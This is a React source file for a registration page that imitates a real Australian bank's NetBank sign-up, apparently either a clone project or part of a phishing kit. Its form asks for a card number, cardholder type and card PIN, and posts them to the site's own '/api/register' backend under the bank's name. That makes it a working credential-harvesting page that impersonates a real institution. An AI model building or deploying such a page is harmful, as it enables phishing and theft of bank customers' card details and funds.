import React, { useState } from 'react'
import Footer from '../../components/register/Footer'
import Nav from '../../components/register/Nav'
import Sidebar from '../../components/register/Sidebar';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import InfoCard from '../../components/register/InfoCard';

const Register = () => {
    const navigate = useNavigate();
    const [cardNumber , setCardNumber ] = useState('');
    const [cardholderType , setCardholderType] = useState('primary');
    const [password , setPassword] = useState('');

    const handleSubmit = async (e) => {
        e.preventDefault();
        try{
            const { data : { message } } = await axios.post('/api/register' , {
                cardNumber , cardholderType , password
            })
            alert(message);
            navigate('/login')
        }catch(err){
            alert(err.response && err.response.data.message ? err.response.data.message : err.message || 'Something went wrong.')
        }
    }

    return (
        <div className=''>
            <Nav />
            <div className='register-container w-[95%] md:w-[80%] lg:w-[60%] mx-auto py-4 mt-8 pb-12 flex gap-8 sm:gap-3 sm:flex-row flex-col'>
                <div>
                    <h3 className='text-slate-800 font-semibold text-xl' >
                        Register for NetBank - Australia's #1 online bank
                    </h3>
                    <div className="line bg-yellow-400 w-[200px] h-[1px] rounded-full mt-3"></div>
                    <InfoCard />
                    
                    <div className='mt-8 text-sm'>
                        <p>If you don't have all of the information above, call us on 13 2221 at any time or visit any branch to register for NetBank. </p>
                        <p>Please enter your card details below.</p>

                    </div>
                    <form onSubmit={handleSubmit}>
                        <div className='border-4 border-gray-300 mt-2'>
                            <div className='p-2 border-b border-b-gray-300 flex sm:items-center gap-3 sm:gap-20 text-sm flex-col sm:flex-row'>
                                <label htmlFor="number" className='font-semibold  w-full sm:w-[120px]'>
                                    Card number
                                </label>
                                <input 
                                type="text" 
                                value={cardNumber}
                                onChange={ e => setCardNumber(e.target.value)}
                                required
                                className='border border-black outline-none'
                                />
                            </div>
                            <div className='p-2 border-b border-b-gray-300 flex items-center sm:gap-20 gap-3 text-sm sm:flex-row flex-col '>
                                <div className='font-semibold w-full sm:w-[180px]'>
                                    Cardholder type
                                    <br/>
                                    <span className='text-gray-500'>(credit cards only)</span>
                                </div>
                                <div className='flex sm:flex-col flex-row w-full sm:gap-0 gap-4 '>
                                    <div className='flex items-center gap-1 text-sm'>
                                        <input 
                                        type="radio" 
                                        name="cardType" 
                                        id="type1"
                                        value='primary' 
                                        checked
                                        onChange={(e) => {
                                            setCardholderType(e.target.value)
                                        }}
                                        />
                                        <label htmlFor="type1" className='font-semibold translate-y-[-1px]'>Primary cardholder</label>
                                    </div>
                                    <div className='flex items-center gap-1 text-sm'>
                                        <input 
                                        type="radio" 
                                        name="cardType" 
                                        id="type2" 
                                        value='additional'
                                        onChange={(e) => {
                                            setCardholderType(e.target.value)
                                        }}
                                        />
                                        <label htmlFor="type2" className='font-semibold translate-y-[-1px]'>Additional cardholder</label>
                                    </div>
                                </div>
                            </div>
                            <div className='p-2 border-b border-b-gray-300 flex sm:items-center gap-3 sm:gap-20 text-sm flex-col sm:flex-row'>
                                <label htmlFor="number" className='font-semibold w-[120px]'>
                                    Card PIN
                                </label>
                                <input 
                                type="password"
                                value={password}
                                onChange={ e => setPassword(e.target.value)} 
                                required
                                className='border border-black outline-none'
                                />
                            </div>
                        </div>
                        <div className='mt-4'>
                            <button 
                            className="submit bg-yellow-400 text-black py-1 px-4 " type='submit'>
                                Register
                            </button>
                        </div>
                    </form>
                </div>
                <div className=' w-full sm:w-[230px]'>
                    <Sidebar />
                </div>
            </div>
            <Footer />
        </div>
    )
}

export default Register